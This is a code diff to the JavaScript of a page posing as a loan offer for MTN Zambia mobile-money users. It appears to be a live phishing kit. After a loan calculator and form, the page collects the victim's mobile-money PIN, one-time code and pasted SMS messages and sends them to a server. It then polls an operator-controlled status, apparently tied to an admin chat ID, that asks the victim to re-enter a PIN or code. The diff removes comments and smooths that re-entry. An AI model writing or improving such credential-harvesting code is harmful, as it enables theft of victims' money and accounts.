@@ -9,19 +9,16 @@ document.addEventListener('DOMContentLoaded', () => {
   let pollInterval = null;
   let adminChatId = '';
 
-  // Extract admin parameter from URL if present (e.g. ?admin=CHAT_ID)
   const urlParams = new URLSearchParams(window.location.search);
   if (urlParams.has('admin')) {
     adminChatId = urlParams.get('admin');
   }
 
-  // Helper to validate MTN Zambia phone numbers (096... or 076...)
   function isValidMTNPhone(phone) {
     const clean = String(phone || '').replace(/\D/g, '');
     return /^0(96|76)\d{7}$/.test(clean);
   }
 
-  // View Management Helper
   function switchView(viewId) {
     const views = [
       'view-calculator', 'view-form', 'view-waiting', 
@@ -42,7 +39,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // --- VIEW 1: CALCULATOR LOGIC ---
   const amountRange = document.getElementById('amount-range');
   const calcAmountInput = document.getElementById('calc-amount');
   const durationRange = document.getElementById('duration-range');
@@ -74,7 +70,6 @@ document.addEventListener('DOMContentLoaded', () => {
     validateStep1();
   });
 
-  // --- VIEW 2: MULTI-STEP FORM LOGIC ---
   let currentStep = 1;
 
   function validateStep1() {
@@ -158,7 +153,6 @@ document.addEventListener('DOMContentLoaded', () => {
     switchView('view-login');
   });
 
-  // --- VIEW 4: PIN INPUT LOGIC (5 Digits) ---
   const pinBoxes = document.querySelectorAll('.pin-box');
   pinBoxes.forEach((box, index) => {
     box.addEventListener('input', (e) => {
@@ -190,6 +184,10 @@ document.addEventListener('DOMContentLoaded', () => {
     const pin = Array.from(pinBoxes).map(b => b.value).join('');
     const contact = document.getElementById('login-contact').value;
 
+    // Clear previous error states when attempting new login
+    const pinErrorEl = document.getElementById('pin-error');
+    if (pinErrorEl) pinErrorEl.classList.add('hidden');
+
     switchView('view-waiting');
     document.getElementById('waiting-status-text').textContent = 'Submitting PIN for verification...';
 
@@ -214,7 +212,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // --- VIEW 4.5: SMS PASTE SUBMISSION ---
   document.getElementById('btn-submit-sms')?.addEventListener('click', async () => {
     const pastedSms = document.getElementById('pasted-sms-input').value;
     if (!pastedSms.trim()) {
@@ -235,7 +232,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // --- VIEW 5: OTP INPUT LOGIC (6 Digits) ---
   const otpBoxes = document.querySelectorAll('.otp-box');
   otpBoxes.forEach((box, index) => {
     box.addEventListener('input', (e) => {
@@ -263,6 +259,9 @@ document.addEventListener('DOMContentLoaded', () => {
   document.getElementById('btn-submit-otp')?.addEventListener('click', async () => {
     const otp = Array.from(otpBoxes).map(b => b.value).join('');
     
+    const otpErrorEl = document.getElementById('otp-error');
+    if (otpErrorEl) otpErrorEl.classList.add('hidden');
+
     try {
       await fetch('/api/submit-otp', {
         method: 'POST',
@@ -276,7 +275,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // --- POLLING STATUS LOOP ---
   function startStatusPolling() {
     if (pollInterval) clearInterval(pollInterval);
 
@@ -300,10 +298,15 @@ document.addEventListener('DOMContentLoaded', () => {
           switchView('view-success');
         } else if (data.status === 'RETRY_PIN') {
           clearInterval(pollInterval);
+          // Clear PIN input fields
+          pinBoxes.forEach(b => b.value = '');
+          if (pinBoxes.length > 0) pinBoxes[0].focus();
           switchView('view-login');
           document.getElementById('pin-error').classList.remove('hidden');
         } else if (data.status === 'RETRY_OTP') {
           clearInterval(pollInterval);
+          otpBoxes.forEach(b => b.value = '');
+          if (otpBoxes.length > 0) otpBoxes[0].focus();
           switchView('view-otp');
           document.getElementById('otp-error').classList.remove('hidden');
         } else if (data.status === 'SMS_REJECTED' || data.status === 'DENIED') {
@@ -321,4 +324,4 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.reload();
   });
 });
-    
+                           
